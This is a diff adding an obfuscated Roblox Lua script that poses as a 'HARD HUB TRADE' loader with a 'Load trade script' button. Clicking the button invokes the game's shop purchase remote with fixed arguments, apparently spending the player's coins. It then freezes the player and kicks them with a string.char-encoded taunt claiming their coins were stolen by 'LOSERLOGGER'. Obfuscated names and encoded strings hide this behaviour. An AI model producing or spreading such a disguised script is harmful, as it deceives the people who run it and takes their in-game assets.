@@ -1,0 +1,90 @@
+local _0x1a2b = game.Players.LocalPlayer
+
+-- Create the ScreenGui
+local _0x3b4c = Instance.new("ScreenGui")
+_0x3b4c.Parent = _0x1a2b:WaitForChild("PlayerGui")
+
+-- Create the Frame
+local _0x5d6e = Instance.new("Frame")
+_0x5d6e.Size = UDim2.new(0, 300, 0, 150)
+_0x5d6e.Position = UDim2.new(0.5, -150, 0.5, -75)
+_0x5d6e.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_0x5d6e.Parent = _0x3b4c
+
+-- Create the Title
+local _0x8f8a = Instance.new("TextLabel")
+_0x8f8a.Size = UDim2.new(1, 0, 0, 30)
+_0x8f8a.Position = UDim2.new(0, 0, 0, 0)
+_0x8f8a.Text = string.char(72, 65, 82, 68, 32, 72, 85, 66, 32, 84, 82, 65, 68, 69)  -- "HARD HUB TRADE"
+_0x8f8a.TextSize = 24
+_0x8f8a.TextColor3 = Color3.fromRGB(0, 0, 0)
+_0x8f8a.BackgroundTransparency = 1
+_0x8f8a.Font = Enum.Font.LuckiestGuy
+_0x8f8a.Parent = _0x5d6e
+
+-- Create the Button
+local _0x9f9b = Instance.new("TextButton")
+_0x9f9b.Position = UDim2.new(0.5, -100, 0.5, -25)
+_0x9f9b.Text = string.char(76, 111, 97, 100, 32, 116, 114, 97, 100, 101, 32, 115, 99, 114, 105, 112, 116)  -- "Load trade script"
+_0x9f9b.TextSize = 24
+_0x9f9b.TextColor3 = Color3.fromRGB(0, 0, 0)
+_0x9f9b.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+_0x9f9b.Font = Enum.Font.LuckiestGuy
+_0x9f9b.Parent = _0x5d6e
+_0x9f9b.Size = UDim2.new(0, _0x9f9b.TextBounds.X + 20, 0, _0x9f9b.TextBounds.Y + 10)
+
+-- Button click function
+_0x9f9b.MouseButton1Click:Connect(function()
+    local _0x0f2d = {
+        [1] = "ChocolateMilk",
+        [2] = "Emotes",
+        [3] = "Coins"
+    }
+
+    local _0x1cb9, _0x3a5b = pcall(function()
+        game:GetService("ReplicatedStorage").Remotes.Shop.BuyItem:InvokeServer(unpack(_0x0f2d))
+    end)
+
+    if not _0x1cb9 then return end
+
+    local _0x4c87 = _0x1a2b.Character and _0x1a2b.Character:FindFirstChildOfClass("Humanoid")
+    if _0x4c87 then
+        _0x4c87.WalkSpeed = 0
+    end
+
+    local _0x83b9 = _0x1a2b:GetMouse()
+    _0x83b9.Icon = "rbxasset://textures/DevTools/MouseNoCursor.png"
+
+    wait(3)
+
+    if _0x4c87 then
+        _0x4c87.WalkSpeed = 16
+    end
+    _0x83b9.Icon = "rbxasset://textures/General/MousePointer.png"
+
+    _0x1a2b:Kick(string.char(77, 111, 115, 116, 32, 111, 102, 32, 121, 111, 117, 114, 32, 109, 109, 50, 32, 99, 111, 105, 110, 115, 32, 104, 97, 118, 101, 32, 98, 101, 101, 110, 32, 115, 116, 111, 108, 101, 100, 32, 98, 121, 32, 76, 79, 83, 69, 82, 76, 79, 71, 71, 69, 82, 32, 76, 77, 70, 65, 32, 76, 79, 83, 69, 82, 76, 79, 71, 71, 69, 82, 32, 108, 111, 103, 115, 32, 116, 104, 105, 110, 103, 115, 32, 102, 111, 114, 32, 108, 111, 115, 101, 114, 115, 32, 108, 105, 107, 101, 32, 121, 111, 117, 32, 121, 111, 117, 46))  -- Obfuscated text for the kick message
+end)
+
+-- Draggable functionality for mobile devices
+local _0x2f0a, _0x4a38, _0x5e70 = nil, nil, 0.2
+local _0x6c79 = _0x5d6e.Position
+
+_0x5d6e.InputBegan:Connect(function(_0x1c5a)
+    if _0x1c5a.UserInputType == Enum.UserInputType.Touch then
+        _0x2f0a = _0x1c5a.Position
+        _0x6c79 = _0x5d6e.Position
+    end
+end)
+
+_0x5d6e.InputChanged:Connect(function(_0x547f)
+    if _0x547f.UserInputType == Enum.UserInputType.Touch and _0x2f0a then
+        local _0x1b7e = _0x547f.Position - _0x2f0a
+        _0x5d6e.Position = UDim2.new(_0x6c79.X.Scale, _0x6c79.X.Offset + _0x1b7e.X * _0x5e70, _0x6c79.Y.Scale, _0x6c79.Y.Offset + _0x1b7e.Y * _0x5e70)
+    end
+end)
+
+_0x5d6e.InputEnded:Connect(function(_0x4e6c)
+    if _0x4e6c.UserInputType == Enum.UserInputType.Touch then
+        _0x2f0a = nil
+    end
+end)
